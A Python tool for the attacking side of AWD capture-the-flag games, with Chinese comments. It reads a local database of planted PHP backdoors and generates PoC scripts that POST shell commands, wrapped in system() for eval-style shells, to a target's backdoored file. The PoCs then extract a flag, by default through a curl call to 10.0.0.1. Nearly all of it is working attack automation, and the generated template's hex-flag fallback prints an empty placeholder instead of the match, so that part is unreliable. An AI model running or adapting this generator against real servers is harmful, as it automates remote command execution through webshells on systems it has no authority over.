#!/usr/bin/env python3
"""
AWD-Red PoC Helper Tool (awd-poc)
自动化从平台漏洞库读取暗桩，一键生成符合双轨传参、2秒超时、标准Flag提取契约的 PoC，
并直接交付至 AWD-Red 平台 pocs/incoming/ 目录实现零等待热加载。
"""

import os
import sys
import json
import sqlite3
import argparse
import py_compile
import subprocess
import urllib.request
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

def find_awd_red_dir():
    if os.environ.get("AWD_RED_DIR"):
        return Path(os.environ["AWD_RED_DIR"]).resolve()
    # 优先检测上级发布包根目录
    bundle_root = Path(__file__).resolve().parent.parent.parent.parent
    if (bundle_root / "core" / "db.py").exists():
        return bundle_root
    # 检测当前工作目录
    cur = Path.cwd()
    for _ in range(4):
        if (cur / "core" / "db.py").exists():
            return cur
        cur = cur.parent
    return Path.home() / "awd-red"

AWD_RED_DIR = find_awd_red_dir()
INCOMING_DIR = AWD_RED_DIR / "pocs" / "incoming"
READY_DIR = AWD_RED_DIR / "pocs" / "ready"
DB_PATH = AWD_RED_DIR / "data" / "platform.db"
API_VULNS = "http://127.0.0.1:8800/api/vulns"
SETTINGS_PATH = AWD_RED_DIR / "config" / "settings.json"


def get_vulns():
    """获取所有漏洞数据 (优先 HTTP API，回退 SQLite)"""
    try:
        req = urllib.request.Request(API_VULNS, headers={"Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=1.5) as resp:
            if resp.status == 200:
                return json.loads(resp.read().decode("utf-8"))
    except Exception:
        pass

    if DB_PATH.exists():
        try:
            conn = sqlite3.connect(str(DB_PATH))
            conn.row_factory = sqlite3.Row
            rows = conn.execute("SELECT * FROM vulns ORDER BY verified DESC, level DESC, id ASC").fetchall()
            conn.close()
            return [dict(r) for r in rows]
        except Exception:
            pass
    return []


def get_default_flag_cmd():
    """主动从 AWD-Red 平台读取当前配置的取旗命令，优先从 HTTP API 获取，回退 settings.json"""
    try:
        req = urllib.request.Request("http://127.0.0.1:8800/api/settings", headers={"Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=1.5) as resp:
            if resp.status == 200:
                data = json.loads(resp.read().decode("utf-8"))
                cmd = data.get("settings", {}).get("get_flag_cmd", "").strip()
                if cmd:
                    return cmd
    except Exception:
        pass

    if SETTINGS_PATH.exists():
        try:
            with open(SETTINGS_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
                cmd = data.get("get_flag_cmd", "").strip()
                if cmd:
                    return cmd
        except Exception:
            pass
    return "curl -s 'http://10.0.0.1/get_flag'"


def cmd_list(args):
    vulns = get_vulns()
    if not vulns:
        print("[-] 暂无漏洞记录。可先运行 awd-vulscan 进行自动审计与落库。")
        return

    print("=" * 80)
    print("AWD-Red 平台漏洞库 (可一键生成 PoC)")
    print("=" * 80)
    print(f"{'ID':<4} | {'探活':<6} | {'等级':<6} | {'类型':<14} | {'文件:行号':<26} | {'传参'}")
    print("-" * 80)
    for v in vulns:
        v_id = v.get("id", "-")
        verified_str = "🟢 存活" if v.get("verified") == 1 else "⚪ 未验证"
        level_str = f"L{v.get('level', 3)}"
        v_type = v.get("vuln_type", "后门")[:12]
        loc = f"{v.get('file', '')}:{v.get('line', 1)}"[:24]
        param = v.get("param", "-") or "-"
        print(f"{v_id:<4} | {verified_str:<6} | {level_str:<6} | {v_type:<14} | {loc:<26} | {param}")
    print("=" * 80)
    print("👉 一键生成并交付 PoC: python3 poc_helper.py gen <ID>")


def cmd_gen(args):
    vulns = get_vulns()
    if not vulns:
        print("[-] 漏洞库为空，无法生成。")
        return

    target_vuln = None
    if args.id_or_file.isdigit():
        target_vuln = next((v for v in vulns if str(v.get("id")) == args.id_or_file), None)
    if not target_vuln:
        target_vuln = next((v for v in vulns if args.id_or_file in str(v.get("file", ""))), None)

    if not target_vuln:
        print(f"[-] 未找到匹配的漏洞项: {args.id_or_file}")
        return

    file_rel = target_vuln.get("file", "index.php").lstrip("/")
    raw_param = target_vuln.get("param", "1") or "1"
    # 清洗参数名：剥离 D盾 / 扫描器前缀，如 'REQUEST:a' -> 'a', 'POST:x' -> 'x', 'GET:id' -> 'id'
    clean_p = raw_param.strip()
    if ":" in clean_p:
        clean_p = clean_p.split(":")[-1].strip()
    param = clean_p or "1"
    v_type = target_vuln.get("vuln_type", "eval")
    default_cmd = get_default_flag_cmd()

    # 生成规范英文字符名称
    import re
    file_part = re.sub(r'[^a-zA-Z0-9_]', '_', file_rel.replace('.php', ''))
    vtype_part = 'eval' if 'eval' in v_type.lower() else ('cmd' if 'system' in v_type.lower() or 'exec' in v_type.lower() or 'shell' in v_type.lower() else 'backdoor')
    poc_name = f"{file_part}_{vtype_part}_poc"
    poc_name = re.sub(r'_+', '_', poc_name).strip('_')
    if args.name:
        poc_name = args.name

    # 判断是否为 PHP 代码执行漏洞 (eval / assert) 还是纯系统命令执行 (system / exec)
    is_code_eval = any(k in v_type.lower() for k in ["eval", "assert", "assert后门", "一句话", "木马"])
    # Pre-define variables for f-string expansion
    text = ""
    m_group = ""
    
    poc_content = f'''#!/usr/bin/env python3
"""
AWD-Red Automated PoC: {poc_name}
Target Vuln: {file_rel} ({v_type})
Contract:
  - sys.argv[1]: Target IPv4
  - sys.argv[2] / os.environ["GET_FLAG_CMD"]: Flag Command (Platform dynamic inject)
  - Timeout: <= 2.0s
"""

import sys
import os
import requests

# 平台配置的取旗命令（PoC 生成时已自动从 AWD-Red 平台读取并固化为默认常量）
DEFAULT_FLAG_CMD = "{default_cmd}"

def exploit(target_ip, flag_cmd=None):
    # 双轨获取取旗命令：优先使用调度传参 sys.argv[2] 或环境变量，若未传则使用平台配置的 DEFAULT_FLAG_CMD
    if not flag_cmd:
        flag_cmd = os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)

    url = f"http://{{target_ip}}/{file_rel}"
    
    # 构造取旗载荷
    # 若为 PHP eval/assert 代码执行，自动包裹 system('...') 确保执行 shell 命令并回显
    is_php_eval = {is_code_eval}
    if is_php_eval and not any(fn in {repr(default_cmd)} for fn in ["system(", "passthru(", "exec(", "shell_exec("]):
        # 剥离可能存在的外部引号
        escaped_cmd = flag_cmd.replace("'", "\\'")
        final_payload = f"system('{{escaped_cmd}}');"
    else:
        final_payload = flag_cmd

    payload = {{
        "{param}": final_payload
    }}

    try:
        resp = requests.post(url, data=payload, timeout=2.0)
        text = resp.text.strip()
        if text:
            # 1. 命中标准 flag{...}
            if "flag{{" in text or "FLAG{{" in text:
                print(text)
            # 2. 命中纯文本 32/36/40 位哈希 Flag
            elif len(text) in [32, 36, 40] and all(c in "0123456789abcdefABCDEF-" for c in text):
                print(f"flag{{{{{{text}}}}}}")
            elif resp.status_code == 200:
                import re
                m = re.search(r"[a-fA-F0-9]{{32}}", text)
                if m:
                    print(f"flag{{{{{repr(m_group)}}}}}")
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(0)
    
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2].strip() else None
    exploit(target, cmd)
'''

    INCOMING_DIR.mkdir(parents=True, exist_ok=True)
    out_file = INCOMING_DIR / f"{poc_name}.py"

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(poc_content)

    os.chmod(out_file, 0o755)

    # 语法校验
    try:
        py_compile.compile(str(out_file), doraise=True)
        print(f"[✅] PoC 生成且语法校验通过！")
        print(f"👉 交付路径: {out_file}")
        print(f"👉 AWD-Red 平台将在 3 秒内自动编译热加载并参与下一轮 10 分钟自动调度！")
        print(f"\n[测试方法]:")
        print(f"  python3 {out_file} <目标IP>")
    except Exception as e:
        print(f"[-] PoC 语法检查失败: {e}")


def cmd_test(args):
    poc_arg = args.poc if args.poc.endswith('.py') else f"{args.poc}.py"
    poc_path = Path(poc_arg)
    if not poc_path.exists():
        candidate = INCOMING_DIR / poc_path.name
        if candidate.exists():
            poc_path = candidate
        else:
            candidate2 = READY_DIR / poc_path.name
            if candidate2.exists():
                poc_path = candidate2

    if not poc_path.exists():
        print(f"[-] 找不到 PoC 文件: {args.poc}")
        return

    target_ip = args.target
    flag_cmd = args.flag_cmd or get_default_flag_cmd()

    print(f"[*] 测试运行 PoC: {poc_path.name} -> {target_ip} (FlagCmd: {flag_cmd[:40]}...)")
    try:
        proc = subprocess.run(
            [sys.executable, str(poc_path), target_ip, flag_cmd],
            capture_output=True,
            text=True,
            timeout=3.5
        )
        print(f"[+] 退出码: {proc.returncode}")
        if proc.stdout.strip():
            print(f"[stdout 回显]:\n{proc.stdout.strip()}")
        if proc.stderr.strip():
            print(f"[stderr 报错]:\n{proc.stderr.strip()}")
        if not proc.stdout.strip() and not proc.stderr.strip():
            print("[-] 无回显（可能连接被拦截或超时静默）")
    except subprocess.TimeoutExpired:
        print(f"[-] 执行超时 (>3.5s)，请检查 PoC 请求 timeout 是否 <= 2.0s！")
    except Exception as e:
        print(f"[-] 执行异常: {e}")


def main():
    parser = argparse.ArgumentParser(description="AWD-Red PoC 快速生成与交付工具")
    subparsers = parser.add_subparsers(dest="cmd")

    p_list = subparsers.add_parser("list", help="查看漏洞库中待利用的漏洞暗桩")

    p_gen = subparsers.add_parser("gen", help="从漏洞库 ID 快速生成合规 PoC 并交付")
    p_gen.add_argument("id_or_file", help="漏洞 ID (如 1) 或文件名子串 (如 curl.php)")
    p_gen.add_argument("--name", help="自定义 PoC 文件名")

    p_test = subparsers.add_parser("test", help="单目标本地测试 PoC")
    p_test.add_argument("poc", help="PoC 路径或文件名")
    p_test.add_argument("target", help="目标靶机 IPv4")
    p_test.add_argument("--flag-cmd", help="自定义取旗命令")

    args = parser.parse_args()
    if args.cmd == "list":
        cmd_list(args)
    elif args.cmd == "gen":
        cmd_gen(args)
    elif args.cmd == "test":
        cmd_test(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
